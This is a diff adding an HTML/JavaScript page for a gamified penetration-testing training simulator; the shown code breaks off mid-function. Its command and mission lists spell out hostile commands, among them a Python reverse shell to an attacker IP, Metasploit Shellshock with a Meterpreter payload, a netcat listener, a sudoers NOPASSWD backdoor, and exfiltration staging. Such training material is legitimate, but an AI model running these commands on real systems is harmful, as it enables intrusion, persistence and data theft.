@@ -1,0 +1,1662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Team Pentester - Linux Command Training</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #cc3300;
+            --secondary: #990000;
+            --terminal-bg: #0c0c0c;
+            --terminal-red: #ff3333;
+            --terminal-yellow: #ffff00;
+            --terminal-green: #00cc00;
+            --terminal-blue: #3399ff;
+            --terminal-purple: #cc66ff;
+            --panel-bg: #1a1a1a;
+            --text-light: #d0d0d0;
+            --border-color: #333;
+            --hint-yellow: #ffcc00;
+            --hint-blue: #66ccff;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a0000 0%, #330000 100%);
+            color: var(--text-light);
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 10px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--primary);
+            flex-shrink: 0;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+        }
+        
+        h1 {
+            color: var(--terminal-red);
+            margin-bottom: 5px;
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+        }
+        
+        .tagline {
+            color: #ff9999;
+            font-size: 1.1rem;
+        }
+        
+        .scenario-info {
+            background: rgba(153, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            border-left: 3px solid var(--primary);
+        }
+        
+        .game-area {
+            display: flex;
+            gap: 15px;
+            flex: 1;
+            min-height: 0;
+        }
+        
+        .terminal-container {
+            flex: 2;
+            min-width: 400px;
+            background-color: var(--terminal-bg);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(204, 51, 0, 0.3);
+            border: 1px solid #660000;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .right-panel {
+            flex: 1;
+            min-width: 250px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .terminal-header {
+            background: linear-gradient(90deg, #330000 0%, #660000 100%);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .terminal-tabs {
+            display: flex;
+        }
+        
+        .terminal-tab {
+            padding: 10px 15px;
+            background-color: #4d0000;
+            color: #ff9999;
+            cursor: pointer;
+            border-right: 1px solid var(--border-color);
+        }
+        
+        .terminal-tab.active {
+            background-color: #330000;
+            color: var(--terminal-red);
+            font-weight: bold;
+        }
+        
+        .terminal-title {
+            color: #ff9999;
+            font-weight: bold;
+            padding-right: 15px;
+        }
+        
+        .terminal-controls {
+            display: flex;
+            gap: 8px;
+            padding-right: 10px;
+        }
+        
+        .control-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .close { background-color: #ff5f56; }
+        .minimize { background-color: #ffbd2e; }
+        .maximize { background-color: #27c93f; }
+        
+        .terminal-content {
+            flex: 1;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .terminal-body {
+            padding: 20px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .commands-reference {
+            padding: 20px;
+            flex: 1;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .commands-reference.active {
+            display: block;
+        }
+        
+        .command-category {
+            color: var(--terminal-red);
+            font-weight: bold;
+            margin: 15px 0 10px 0;
+            border-bottom: 1px solid #660000;
+            padding-bottom: 5px;
+        }
+        
+        .command-item {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #1a1a1a;
+            border-radius: 5px;
+            border-left: 3px solid #660000;
+        }
+        
+        .command-name {
+            color: var(--terminal-red);
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .command-desc {
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+        
+        .terminal-line {
+            margin-bottom: 10px;
+            line-height: 1.5;
+            display: flex;
+            align-items: center;
+        }
+        
+        .terminal-prompt {
+            color: var(--terminal-red);
+            font-weight: bold;
+            margin-right: 5px;
+        }
+        
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: var(--text-light);
+            font-size: 1rem;
+            flex: 1;
+            outline: none;
+            caret-color: var(--terminal-red);
+        }
+        
+        .cmd-output {
+            color: #ccc;
+        }
+        
+        .cmd-output.success {
+            color: var(--terminal-green);
+        }
+        
+        .cmd-output.error {
+            color: var(--terminal-red);
+        }
+        
+        .cmd-output.info {
+            color: var(--terminal-blue);
+        }
+        
+        .cmd-output.hint {
+            color: var(--hint-yellow);
+            font-style: italic;
+        }
+        
+        .cmd-output.answer {
+            color: var(--terminal-green);
+            font-weight: bold;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 5px;
+            border-radius: 3px;
+        }
+        
+        .stats-panel {
+            flex: 1;
+            min-width: 250px;
+            background-color: var(--panel-bg);
+            border-radius: 8px;
+            padding: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            box-shadow: 0 5px 15px rgba(204, 51, 0, 0.3);
+            border: 1px solid #660000;
+        }
+        
+        .stats-title {
+            color: var(--terminal-red);
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.5rem;
+            border-bottom: 1px solid #660000;
+            padding-bottom: 10px;
+        }
+        
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed var(--border-color);
+        }
+        
+        .stat-label {
+            color: #ff9999;
+        }
+        
+        .stat-value {
+            color: var(--terminal-red);
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background-color: #330000;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary) 0%, #ff6600 100%);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .objectives-panel {
+            min-width: 300px;
+            background-color: var(--panel-bg);
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(204, 51, 0, 0.3);
+            border: 1px solid #660000;
+            height: fit-content;
+        }
+        
+        #objectives-container {
+            height: 250px;
+            overflow-y: auto;
+        }
+        
+        .objectives-title {
+            color: var(--terminal-red);
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.5rem;
+            border-bottom: 1px solid #660000;
+            padding-bottom: 10px;
+        }
+        
+        .objective-item {
+            background-color: #2a0000;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #660000;
+            transition: all 0.3s;
+        }
+        
+        .objective-item.active {
+            border-left-color: var(--terminal-red);
+            background-color: #330000;
+            box-shadow: 0 0 10px rgba(255, 51, 51, 0.2);
+        }
+        
+        .objective-item.completed {
+            border-left-color: var(--terminal-green);
+            opacity: 0.8;
+        }
+        
+        .objective-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .objective-name {
+            font-weight: bold;
+            color: #ff9999;
+        }
+        
+        .objective-xp {
+            color: var(--terminal-yellow);
+            font-weight: bold;
+        }
+        
+        .objective-desc {
+            color: #ccc;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+        
+        .hints-container {
+            margin-top: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 5px;
+        }
+        
+        .hint-item {
+            color: #ccc;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            padding-left: 15px;
+            position: relative;
+            display: none;
+        }
+        
+        .hint-item.visible {
+            display: block;
+        }
+        
+        .hint-item:before {
+            content: "💡";
+            position: absolute;
+            left: 0;
+        }
+        
+        .hint-item.used {
+            color: var(--hint-yellow);
+        }
+        
+        .hint-item.answer {
+            color: var(--terminal-green);
+            font-weight: bold;
+        }
+        
+        .hint-item.answer:before {
+            content: "🎯";
+        }
+        
+        .hint-button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            margin-top: 5px;
+            display: inline-block;
+        }
+        
+        .hint-button:hover {
+            background: #ff5500;
+        }
+        
+        .hint-button:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+        
+        .achievement-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(90deg, #660000 0%, var(--primary) 100%);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            transform: translateX(150%);
+            transition: transform 0.5s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid var(--terminal-red);
+        }
+        
+        .achievement-toast.show {
+            transform: translateX(0);
+        }
+        
+        .level-up {
+            background: linear-gradient(90deg, #ff9900 0%, var(--terminal-yellow) 100%);
+            color: #000;
+        }
+        
+        .target-info {
+            background: rgba(102, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            border: 1px dashed #660000;
+        }
+        
+        .target-title {
+            color: var(--terminal-red);
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .target-desc {
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 1100px) {
+            .game-area {
+                flex-direction: column;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 5px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .tagline {
+                font-size: 0.9rem;
+            }
+            
+            .game-area {
+                gap: 10px;
+            }
+            
+            .terminal-body {
+                height: 300px;
+                padding: 15px;
+            }
+            
+            .right-panel {
+                gap: 10px;
+            }
+            
+            .stats-panel, .objectives-panel {
+                padding: 15px;
+            }
+            
+            #objectives-container {
+                height: 80px;
+            }
+        }
+        
+        .blinking-cursor {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-user-secret"></i> Red Team Pentester</h1>
+            <p class="tagline">Gamified Linux command training for cybersecurity red teams</p>
+            <div class="scenario-info">
+                <p><strong>Scenario:</strong> You are a hired pentester for <span style="color: var(--terminal-red)">CyberSecure Corp</span>. Your target is their UAT (User Acceptance Testing) environment. Your contract states you must find and exploit vulnerabilities to demonstrate security risks.</p>
+                <p><strong>Rules:</strong> Each mission has up to 3 hints. Use 'hint' command or click hint button. After 3 hints, the answer will be revealed.</p>
+            </div>
+        </header>
+        
+        <div class="game-area">
+            <div class="terminal-container">
+                <div class="terminal-header">
+                    <div class="terminal-tabs">
+                        <div class="terminal-tab active" onclick="switchTab('terminal')">Pentester Terminal</div>
+                        <div class="terminal-tab" onclick="switchTab('commands')">Red Team Commands</div>
+                    </div>
+                    <div class="terminal-controls">
+                        <div class="control-btn close"></div>
+                        <div class="control-btn minimize"></div>
+                        <div class="control-btn maximize"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div id="terminal" class="terminal-body">
+                        <!-- Terminal content will be generated by JavaScript -->
+                    </div>
+                    <div id="commands-reference" class="commands-reference">
+                        <!-- Commands reference will be generated by JavaScript -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="right-panel">
+                <div class="objectives-panel">
+                    <h2 class="objectives-title">Active Pentest Missions</h2>
+                    <div id="objectives-container">
+                        <!-- Objectives will be generated by JavaScript -->
+                    </div>
+                </div>
+                
+                <div class="stats-panel">
+                    <h2 class="stats-title">Pentester Profile</h2>
+                    <div class="stat-item">
+                        <span class="stat-label">Skill Level</span>
+                        <span class="stat-value" id="level">1</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-label">Reputation</span>
+                        <span class="stat-value" id="xp">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-label">Exploits Used</span>
+                        <span class="stat-value" id="exploits-used">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-label">Vulnerabilities Found</span>
+                        <span class="stat-value" id="vulnerabilities-found">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-label">Success Rate</span>
+                        <span class="stat-value" id="success-rate">100%</span>
+                    </div>
+                    
+                    <div class="progress-container">
+                        <div class="stat-item">
+                            <span class="stat-label">Next Level</span>
+                            <span class="stat-value" id="next-level-xp">100</span>
+                        </div>
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="xp-progress"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Current Role</span>
+                        <span class="stat-value" id="current-role">Junior Pentester</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="achievement-toast" id="achievement-toast">
+        <i class="fas fa-skull-crossbones"></i>
+        <div class="toast-content">
+            <div class="toast-title" id="toast-title">Achievement Unlocked!</div>
+            <div class="toast-desc" id="toast-desc"></div>
+        </div>
+    </div>
+
+    <script>
+        // Game state
+        const gameState = {
+            level: 1,
+            xp: 0,
+            xpToNextLevel: 100,
+            exploitsUsed: 0,
+            vulnerabilitiesFound: 0,
+            totalAttempts: 0,
+            correctAttempts: 0,
+            currentRole: "Junior Pentester",
+            roles: [
+                { name: "Junior Pentester", xpRequired: 0 },
+                { name: "Pentester", xpRequired: 200 },
+                { name: "Senior Pentester", xpRequired: 500 },
+                { name: "Penetration Tester", xpRequired: 1000 },
+                { name: "Red Team Lead", xpRequired: 2000 },
+                { name: "Security Consultant", xpRequired: 4000 }
+            ]
+        };
+
+        // Available commands for red team scenarios
+        const redTeamCommands = [
+            {
+                command: "nmap -sS -sV -O 192.168.1.100",
+                description: "Stealth SYN scan with version and OS detection on target",
+                category: "reconnaissance",
+                difficulty: 1
+            },
+            {
+                command: "nmap -sC -sV -p- 192.168.1.100",
+                description: "Comprehensive scan with default scripts and full port range",
+                category: "reconnaissance",
+                difficulty: 2
+            },
+            {
+                command: "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt",
+                description: "Directory brute force on web server",
+                category: "web_enumeration",
+                difficulty: 2
+            },
+            {
+                command: "nikto -h http://192.168.1.100",
+                description: "Web server vulnerability scanner",
+                category: "vulnerability_scanning",
+                difficulty: 2
+            },
+            {
+                command: "searchsploit apache 2.4.29",
+                description: "Search for Apache 2.4.29 exploits in exploit-db",
+                category: "exploit_research",
+                difficulty: 1
+            },
+            {
+                command: "msfconsole -q",
+                description: "Launch Metasploit Framework quietly",
+                category: "exploitation",
+                difficulty: 1
+            },
+            {
+                command: "use exploit/multi/http/apache_mod_cgi_bash_env_exec",
+                description: "Metasploit: Select Shellshock exploit module",
+                category: "exploitation",
+                difficulty: 3
+            },
+            {
+                command: "set RHOSTS 192.168.1.100",
+                description: "Metasploit: Set target host",
+                category: "exploitation",
+                difficulty: 1
+            },
+            {
+                command: "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
+                description: "Metasploit: Set payload for reverse shell",
+                category: "exploitation",
+                difficulty: 2
+            },
+            {
+                command: "exploit",
+                description: "Metasploit: Execute the exploit",
+                category: "exploitation",
+                difficulty: 1
+            },
+            {
+                command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                description: "Python reverse shell to attacker IP 192.168.1.50 port 4444",
+                category: "post_exploitation",
+                difficulty: 3
+            },
+            {
+                command: "find / -type f -perm -4000 2>/dev/null",
+                description: "Find SUID binaries for privilege escalation",
+                category: "privilege_escalation",
+                difficulty: 2
+            },
+            {
+                command: "sudo -l",
+                description: "Check sudo permissions for current user",
+                category: "privilege_escalation",
+                difficulty: 1
+            },
+            {
+                command: "cat /etc/passwd | grep -v nologin | grep -v false",
+                description: "List valid system users with login shells",
+                category: "post_exploitation",
+                difficulty: 1
+            },
+            {
+                command: "uname -a",
+                description: "Display system kernel information",
+                category: "system_info",
+                difficulty: 1
+            },
+            {
+                command: "whoami && id",
+                description: "Show current user and group information",
+                category: "system_info",
+                difficulty: 1
+            },
+            {
+                command: "netstat -tulpn",
+                description: "Show listening ports and associated processes",
+                category: "network_enumeration",
+                difficulty: 1
+            },
+            {
+                command: "ps aux | grep root",
+                description: "List processes running as root",
+                category: "process_enumeration",
+                difficulty: 1
+            },
+            {
+                command: "cat /etc/crontab",
+                description: "View system cron jobs",
+                category: "privilege_escalation",
+                difficulty: 1
+            },
+            {
+                command: "tar czf /tmp/data.tar.gz /var/www/html",
+                description: "Compress web directory for exfiltration",
+                category: "data_exfiltration",
+                difficulty: 2
+            },
+            {
+                command: "nc -lvnp 4444",
+                description: "Set up Netcat listener on port 4444",
+                category: "post_exploitation",
+                difficulty: 2
+            },
+            {
+                command: "ssh-keygen -t rsa -f /tmp/id_rsa",
+                description: "Generate SSH keypair for persistence",
+                category: "persistence",
+                difficulty: 2
+            },
+            {
+                command: "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+                description: "Add sudo privileges without password (DANGEROUS - for demo only)",
+                category: "privilege_escalation",
+                difficulty: 3
+            }
+        ];
+
+        // Game objectives (pentest missions) with hints
+        const objectives = [
+            {
+                id: 1,
+                name: "Initial Reconnaissance",
+                description: "Perform initial scan on target UAT server (192.168.1.100) to identify open ports and services",
+                requiredCommand: "nmap -sS -sV -O 192.168.1.100",
+                xpReward: 50,
+                completed: false,
+                active: true,
+                hints: [
+                    "Use nmap for network reconnaissance",
+                    "Try a stealth SYN scan with version detection",
+                    "The target IP is 192.168.1.100, use -sS for SYN scan and -sV for version detection"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 2,
+                name: "Web Server Enumeration",
+                description: "The target is running Apache 2.4.29 on port 80. Find hidden directories",
+                requiredCommand: "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt",
+                xpReward: 75,
+                completed: false,
+                active: false,
+                hints: [
+                    "Use a directory brute forcing tool",
+                    "Gobuster is a popular choice for web enumeration",
+                    "The command starts with 'gobuster dir -u' followed by the target URL"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 3,
+                name: "Vulnerability Scanning",
+                description: "Scan the web server for known vulnerabilities using nikto",
+                requiredCommand: "nikto -h http://192.168.1.100",
+                xpReward: 60,
+                completed: false,
+                active: false,
+                hints: [
+                    "Nikto is a web vulnerability scanner",
+                    "The basic syntax is 'nikto -h' followed by the target",
+                    "Use 'nikto -h http://192.168.1.100'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 4,
+                name: "Exploit Research",
+                description: "Search for exploits for Apache 2.4.29",
+                requiredCommand: "searchsploit apache 2.4.29",
+                xpReward: 40,
+                completed: false,
+                active: false,
+                hints: [
+                    "Searchsploit is a tool for searching exploit-db",
+                    "The syntax is 'searchsploit' followed by search terms",
+                    "Try 'searchsploit apache 2.4.29'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 5,
+                name: "Metasploit Initialization",
+                description: "Launch the Metasploit framework quietly",
+                requiredCommand: "msfconsole -q",
+                xpReward: 30,
+                completed: false,
+                active: false,
+                hints: [
+                    "Metasploit is launched with msfconsole",
+                    "Use the -q flag for quiet mode",
+                    "The command is 'msfconsole -q'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 6,
+                name: "Shellshock Exploit",
+                description: "Select the Shellshock exploit module in Metasploit",
+                requiredCommand: "use exploit/multi/http/apache_mod_cgi_bash_env_exec",
+                xpReward: 100,
+                completed: false,
+                active: false,
+                hints: [
+                    "In Metasploit, use 'use' command to select module",
+                    "Shellshock is in multi/http modules",
+                    "The full path is 'exploit/multi/http/apache_mod_cgi_bash_env_exec'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 7,
+                name: "Set Target Host",
+                description: "In Metasploit, set the target host to 192.168.1.100",
+                requiredCommand: "set RHOSTS 192.168.1.100",
+                xpReward: 25,
+                completed: false,
+                active: false,
+                hints: [
+                    "In Metasploit, use 'set' to configure options",
+                    "RHOSTS sets the remote host",
+                    "Use 'set RHOSTS 192.168.1.100'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 8,
+                name: "Reverse Shell Payload",
+                description: "Set the Meterpreter reverse TCP payload for Linux x86",
+                requiredCommand: "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
+                xpReward: 50,
+                completed: false,
+                active: false,
+                hints: [
+                    "Set payload with 'set PAYLOAD'",
+                    "Meterpreter reverse TCP for Linux x86",
+                    "Use 'linux/x86/meterpreter/reverse_tcp' as payload"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 9,
+                name: "Execute Exploit",
+                description: "Launch the exploit in Metasploit",
+                requiredCommand: "exploit",
+                xpReward: 30,
+                completed: false,
+                active: false,
+                hints: [
+                    "After setting everything, run the exploit",
+                    "The command is simply 'exploit' in Metasploit",
+                    "Type 'exploit' or 'run' to execute"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 10,
+                name: "Privilege Escalation Check",
+                description: "Check for SUID binaries that could allow privilege escalation",
+                requiredCommand: "find / -type f -perm -4000 2>/dev/null",
+                xpReward: 80,
+                completed: false,
+                active: false,
+                hints: [
+                    "Use 'find' command to search for files",
+                    "SUID binaries have permission 4000",
+                    "Try 'find / -type f -perm -4000 2>/dev/null'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 11,
+                name: "Sudo Privileges Check",
+                description: "Check what sudo commands current user can run",
+                requiredCommand: "sudo -l",
+                xpReward: 40,
+                completed: false,
+                active: false,
+                hints: [
+                    "Check sudo permissions with 'sudo -l'",
+                    "This shows what commands you can run with sudo",
+                    "The command is 'sudo -l' (lowercase L)"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 12,
+                name: "User Enumeration",
+                description: "List all users with login shells on the system",
+                requiredCommand: "cat /etc/passwd | grep -v nologin | grep -v false",
+                xpReward: 50,
+                completed: false,
+                active: false,
+                hints: [
+                    "User info is stored in /etc/passwd",
+                    "Use grep to filter out non-login accounts",
+                    "Try 'cat /etc/passwd | grep -v nologin | grep -v false'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 13,
+                name: "Python Reverse Shell",
+                description: "Create a Python reverse shell to connect back to attacker machine (192.168.1.50:4444)",
+                requiredCommand: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                xpReward: 150,
+                completed: false,
+                active: false,
+                hints: [
+                    "Use Python one-liner for reverse shell",
+                    "Import socket, subprocess, and os modules",
+                    "Connect back to 192.168.1.50 on port 4444"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 14,
+                name: "Data Exfiltration",
+                description: "Compress the /var/www/html directory for exfiltration",
+                requiredCommand: "tar czf /tmp/data.tar.gz /var/www/html",
+                xpReward: 70,
+                completed: false,
+                active: false,
+                hints: [
+                    "Use tar to create a compressed archive",
+                    "czf flags: c=create, z=gzip, f=file",
+                    "Output to /tmp/data.tar.gz from /var/www/html"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            },
+            {
+                id: 15,
+                name: "Netcat Listener",
+                description: "Set up a Netcat listener on port 4444 for incoming connections",
+                requiredCommand: "nc -lvnp 4444",
+                xpReward: 60,
+                completed: false,
+                active: false,
+                hints: [
+                    "Netcat command is 'nc'",
+                    "Use -l to listen, -v for verbose, -n no DNS, -p for port",
+                    "The command is 'nc -lvnp 4444'"
+                ],
+                hintsUsed: 0,
+                answerRevealed: false
+            }
+        ];
+
+        // Terminal elements
+        const terminal = document.getElementById('terminal');
+        let inputLine = document.createElement('div');
+        inputLine.className = 'terminal-line';
+        const prompt = document.createElement('span');
+        prompt.className = 'terminal-prompt';
+        prompt.textContent = 'pentester@kali:~$ ';
+        let input = document.createElement('input');
+        input.className = 'terminal-input';
+        input.type = 'text';
+
+        // Toast for achievements
+        const achievementToast = document.getElementById('achievement-toast');
+        const toastTitle = document.getElementById('toast-title');
+        const toastDesc = document.getElementById('toast-desc');
+
+        // Initialize the game
+        function initGame() {
+            // Set up initial terminal
+            addTerminalOutput("=== Red Team Pentester Simulator ===", "info");
+            addTerminalOutput("Client: CyberSecure Corp", "info");
+            addTerminalOutput("Target: UAT Environment (192.168.1.100)", "info");
+            addTerminalOutput("Contract: Authorized Penetration Test", "info");
+            addTerminalOutput("", "info");
+            addTerminalOutput("Type 'help' for available commands, 'missions' for objectives, or 'hint' for help with current mission.", "info");
+            addTerminalOutput("Your first mission: Perform initial reconnaissance on the target server.", "info");
+            
+            // Add initial input line
+            inputLine.appendChild(prompt);
+            inputLine.appendChild(input);
+            terminal.appendChild(inputLine);
+            
+            // Set up input handler
+            input.addEventListener('keydown', handleInput);
+            
+            // Initialize objectives
+            renderObjectives();
+            
+            // Initialize command reference
+            renderCommandReference();
+            
+            // Update stats display
+            updateStats();
+            
+            // Focus on input
+            input.focus();
+        }
+
+        // Handle terminal input
+        function handleInput(e) {
+            if (e.key === 'Enter') {
+                const command = input.value.trim();
+                input.value = '';
+                
+                // Display the command entered
+                addTerminalOutput(prompt.textContent + command, "cmd");
+                
+                // Process the command
+                processCommand(command);
+                
+                // Add new input line
+                const newInputLine = document.createElement('div');
+                newInputLine.className = 'terminal-line';
+                const newPrompt = document.createElement('span');
+                newPrompt.className = 'terminal-prompt';
+                newPrompt.textContent = 'pentester@kali:~$ ';
+                const newInput = document.createElement('input');
+                newInput.className = 'terminal-input';
+                newInput.type = 'text';
+                
+                newInputLine.appendChild(newPrompt);
+                newInputLine.appendChild(newInput);
+                terminal.appendChild(newInputLine);
+                
+                // Update reference to new input
+                input = newInput;
+                inputLine = newInputLine;
+                
+                // Set up event listener for new input
+                input.addEventListener('keydown', handleInput);
+                input.focus();
+                
+                // Scroll to bottom of terminal
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+        }
+
+        // Process entered command
+        function processCommand(cmd) {
+            gameState.totalAttempts++;
+            
+            // Check for game commands first
+            if (cmd === 'help') {
+                showHelp();
+                return;
+            }
+            
+            if (cmd === 'missions' || cmd === 'objectives') {
+                showObjectives();
+                return;
+            }
+            
+            if (cmd === 'commands') {
+                showCommandReference();
+                return;
+            }
+            
+            if (cmd === 'clear') {
+                clearTerminal();
+                return;
+            }
+            
+            if (cmd === 'stats') {
+                showStats();
+                return;
+            }
+            
+            if (cmd === 'hint') {
+                giveHint();
+                return;
+            }
+            
+            // Check if command matches any red team command (exact or partial)
+            const exactMatch = redTeamCommands.find(c => 
+                c.command.toLowerCase() === cmd.toLowerCase()
+            );
+            
+            const partialMatch = redTeamCommands.find(c => 
+                c.command.toLowerCase().startsWith(cmd.toLowerCase() + ' ') || 
+                c.command.toLowerCase().split(' ')[0] === cmd.toLowerCase()
+            );
+            
+            if (exactMatch) {
+                const matchedCommand = exactMatch;
+                // Check if this completes an objective
+                const completedObjective = checkObjectiveCompletion(matchedCommand.command);
+                
+                if (completedObjective) {
+                    // Award XP based on difficulty only if it completes a mission
+                    const xpEarned = matchedCommand.difficulty * 25;
+                    gameState.xp += xpEarned;
+                    gameState.exploitsUsed++;
+                    gameState.correctAttempts++;
+                    
+                    // Show success message
+                    addTerminalOutput(`Exploit executed successfully! +${xpEarned} Reputation`, "success");
+                    
+                    // Check for level up
+                    checkLevelUp();
+                    
+                    // Show achievement if it's the first time using this command
+                    if (gameState.exploitsUsed % 5 === 0) {
+                        showAchievement(`Exploit Mastery Level ${Math.floor(gameState.exploitsUsed/5)}`, 
+                        `You've executed ${gameState.exploitsUsed} red team techniques!`);
+                    }
+                } else {
+                    // Command executed but doesn't complete current mission
+                    addTerminalOutput(`Command executed successfully! (No reputation - not part of current mission)`, "info");
+                }
+                
+                // Show simulated output for the command
+                showCommandOutput(matchedCommand);
+                
+                // Update stats
+                updateStats();
+            } else if (partialMatch) {
+                // Partial match - show hint
+                addTerminalOutput(`Command recognized but incomplete. Try: ${partialMatch.command}`, "info");
+                addTerminalOutput(`Description: ${partialMatch.description}`, "info");
+            } else {
+                // Command not recognized
+                addTerminalOutput(`bash: ${cmd}: command not found`, "error");
+                addTerminalOutput("Try 'commands' to see available red team commands", "info");
+            }
+        }
+
+        // Give hint for current mission
+        function giveHint() {
+            const activeObjective = objectives.find(obj => obj.active && !obj.completed);
+            
+            if (!activeObjective) {
+                addTerminalOutput("No active mission. Start a mission first!", "error");
+                return;
+            }
+            
+            if (activeObjective.hintsUsed >= activeObjective.hints.length) {
+                // Show answer if all hints used
+                if (!activeObjective.answerRevealed) {
+                    activeObjective.answerRevealed = true;
+                    addTerminalOutput("All hints used! The correct command is:", "answer");
+                    addTerminalOutput(activeObjective.requiredCommand, "answer");
+                    addTerminalOutput("Enter this command to complete the mission.", "info");
+                } else {
